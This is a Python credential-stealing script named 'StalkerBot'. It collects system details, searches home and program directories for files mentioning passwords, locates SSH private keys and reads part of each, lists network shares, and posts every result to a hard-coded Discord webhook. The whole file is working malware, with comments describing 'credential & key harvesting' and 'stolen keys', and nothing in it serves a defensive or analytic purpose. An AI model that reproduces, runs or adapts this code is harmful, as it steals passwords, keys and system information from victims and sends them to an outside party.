import os
import sys
import platform
import subprocess
import json
import urllib.request
import urllib.error
import uuid
import time
import socket
import threading
from pathlib import Path
from datetime import datetime

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1550538777750143106/7I4_j63iAPnp2zp23t5aEZ4-dEJVOi6l0VEX9RoviWuFA-LsVCsfuMCUdhSZFt3o80iC"
BOT_NAME = "StalkerBot"
LOG_FILE = "stalker_logs.txt"

# --- LOGGING ---
def log(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    print(log_entry)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry + "\n")
    except Exception:
        pass

# --- WEBHOOK SENDER ---
def send_to_discord(title, description, color=0x00ff00, fields=None):
    """
    Sends a message to Discord using a Webhook.
    color: Integer representing the embed color (e.g., 0x00ff00 for green)
    fields: List of dicts with 'name' and 'value' keys
    """
    payload = {
        "embeds": [
            {
                "title": title,
                "description": description,
                "color": color,
                "fields": fields if fields else [],
                "footer": {
                    "text": f"{BOT_NAME} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                },
                "timestamp": datetime.now().isoformat()
            }
        ]
    }

    data = json.dumps(payload).encode('utf-8')
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }

    req = urllib.request.Request(WEBHOOK_URL, data=data, headers=headers, method='POST')
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            status = response.status
            log(f"Successfully sent webhook: {title} (Status: {status})")
    except urllib.error.HTTPError as e:
        log(f"Failed to send to Discord: HTTP Error {e.code}: {e.reason}")
        log(f"Response body: {e.read().decode('utf-8', errors='ignore')}")
    except Exception as e:
        log(f"Failed to send to Discord: {str(e)}")

# --- SYSTEM INFO ---
def get_system_info():
    system_info = f"""
**OS:** {platform.system()} {platform.release()}
**Version:** {platform.version()}
**Architecture:** {platform.architecture()}
**Processor:** {platform.processor()}
**Hostname:** {socket.gethostname()}
**User:** {os.getlogin()}
**IP Address:** {socket.gethostbyname(socket.gethostname())}
**Date/Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    return system_info

# --- CREDENTIAL & KEY HARVESTING ---
def search_for_passwords():
    log("Searching for passwords...")
    found_files = []
    # Common locations for password files
    search_paths = [
        os.path.expanduser("~"),
        "C:\\Users",
        "C:\\Program Files",
        "C:\\ProgramData"
    ]
    
    extensions = ['.txt', '.log', '.csv', '.json', '.xml', '.docx', '.pdf', '.xlsx']
    
    for search_path in search_paths:
        if os.path.exists(search_path):
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if any(file.endswith(ext) for ext in extensions):
                        # Check if it contains common password keywords
                        try:
                            with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read(1024) # Read first 1KB
                                if 'password' in content.lower() or 'pass' in content.lower():
                                    found_files.append(os.path.join(root, file))
                        except Exception:
                            pass
                # Limit search to avoid taking forever
                if len(found_files) > 50:
                    break
        if len(found_files) > 50:
            break
            
    return found_files

def search_for_ssh_keys():
    log("Searching for SSH keys...")
    ssh_keys = []
    # Common SSH key locations
    ssh_dirs = [
        os.path.expanduser("~/.ssh"),
        os.path.expanduser("~/.config/ssh"),
        "C:\\Users\\*.ssh" # Windows doesn't use .ssh by default, but some tools do
    ]
    
    for ssh_dir in ssh_dirs:
        if os.path.exists(ssh_dir):
            for root, dirs, files in os.walk(ssh_dir):
                for file in files:
                    if file in ['id_rsa', 'id_ecdsa', 'id_ed25519', 'id_dsa', 'id_rsa.pub', 'authorized_keys']:
                        ssh_keys.append(os.path.join(root, file))
    return ssh_keys

# --- NETWORK & SMB ---
def check_smb_shares():
    log("Checking SMB shares...")
    shares = []
    # This is a basic check. For a full implementation, you'd use python-smb or impacket.
    # Here we just list visible shares if possible, or just log the attempt.
    try:
        # Try to get current user's network shares
        result = subprocess.run(['net', 'use'], capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            shares = result.stdout.split('\n')
        else:
            shares = ["No SMB shares found or error."]
    except Exception as e:
        shares = [f"Error checking SMB shares: {str(e)}"]
    return shares

def attempt_ssh_login(keys):
    log("Attempting SSH login with stolen keys...")
    results = []
    for key in keys:
        try:
            # Simple test: try to read the key file
            with open(key, 'r') as f:
                content = f.read(100)
                results.append(f"Found key: {key} (First 100 chars: {content[:50]}...)")
        except Exception as e:
            results.append(f"Error reading key {key}: {str(e)}")
    return results

# --- MAIN EXECUTION ---
def main():
    log(f"{BOT_NAME} started.")
    
    # 1. System Info
    sys_info = get_system_info()
    send_to_discord("System Information", sys_info, color=0x00ff00)
    
    # 2. Password Search
    password_files = search_for_passwords()
    if password_files:
        desc = f"Found {len(password_files)} potential password files:\n" + "\n".join(password_files[:10]) + (f"\n... and {len(password_files)-10} more" if len(password_files) > 10 else "")
        send_to_discord("Password Files Found", desc, color=0xffff00)
    else:
        send_to_discord("Password Search", "No obvious password files found in standard locations.", color=0xff0000)
        
    # 3. SSH Keys
    ssh_keys = search_for_ssh_keys()
    if ssh_keys:
        desc = f"Found {len(ssh_keys)} SSH keys:\n" + "\n".join(ssh_keys)
        send_to_discord("SSH Keys Found", desc, color=0xff0000)
    else:
        send_to_discord("SSH Keys", "No SSH keys found in standard locations.", color=0x666666)
        
    # 4. SMB Shares
    smb_shares = check_smb_shares()
    desc = "Local SMB Shares:\n" + "\n".join(smb_shares)
    send_to_discord("SMB Shares", desc, color=0x0000ff)
    
    # 5. SSH Login Attempts
    ssh_results = attempt_ssh_login(ssh_keys)
    if ssh_results:
        desc = "SSH Key Analysis:\n" + "\n".join(ssh_results)
        send_to_discord("SSH Key Analysis", desc, color=0x00ffff)
    
    # 6. Final Status
    send_to_discord("Mission Complete", f"{BOT_NAME} has completed its initial scan. All data has been logged to {LOG_FILE}.", color=0x00ff00)
    
    log(f"{BOT_NAME} has completed its tasks.")

if __name__ == "__main__":
    main()